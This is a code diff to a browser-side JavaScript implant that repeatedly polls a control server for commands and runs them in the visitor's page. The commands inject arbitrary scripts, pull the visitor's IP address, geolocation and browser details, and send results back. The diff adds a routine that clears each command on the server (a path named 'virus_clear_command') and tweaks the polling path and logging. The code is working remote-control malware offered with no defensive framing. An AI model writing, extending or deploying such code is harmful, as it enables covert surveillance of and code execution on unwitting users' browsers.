@@ -5,6 +5,13 @@ console.log("Load OK!")
 
 var loop;
 
+function clear_command() {
+    var xhr = new XMLHttpRequest();
+    var url = window.location.href;
+    xhr.open("POST","/virus_clear_command/"+url.substring(remote.length),true);
+    xhr.send()
+}
+
 function sendReturn(content) {
     var xhr = new XMLHttpRequest();
     var url = window.location.href;
@@ -55,6 +62,7 @@ function exec(command) {
         document.body.appendChild(script);
 
         sendReturn("Run JavaScript ok: "+javaScript)
+        clear_command()
         return true;
     }
     if (command === 'getip') {
@@ -65,9 +73,11 @@ function exec(command) {
             if (xhr.readyState === 4) {
                 if (xhr.status === 200) {
                     sendReturn( "[IP] "+xhr.responseText);
+                    clear_command()
                 }
                 else{
                     sendReturn( "[ ERROR ] GET IP ERROR!" );
+                    clear_command()
                 }
             }
         };
@@ -76,6 +86,7 @@ function exec(command) {
     if (command === 'getlocation')
     {
         getLocation();
+        clear_command()
         return true;
     }
     if (command === 'getinfo') {
@@ -88,14 +99,17 @@ function exec(command) {
             "AppName: "+navigator.appName + '/n' +
             "CookieEnabled: " + navigator.cookieEnabled
         );
+        clear_command()
         return true;
     }
     if (command === 'close') {
         clearInterval(loop)
+        clear_command()
         return true;
     }
     else {
         sendReturn("Command Error: "+command);
+        clear_command()
         return false;
     }
 }
@@ -106,13 +120,13 @@ loop = setInterval(function () {
     try{
         var xhr = new XMLHttpRequest();
         var url = window.location.href;
-        xhr.open("GET","/push/"+url.substring(remote.length)+"/virus_send",true)
+        xhr.open("GET","/push/"+url.substring(remote.length)+"/none",true)
         xhr.send();
 
         xhr.onload = function (e) {
             if (xhr.readyState === 4) {
                 if (xhr.status === 200) {
-                    //console.log(xhr.responseText)
+                    console.log(xhr.responseText)
                     exec(xhr.responseText);
                 }
                 else{
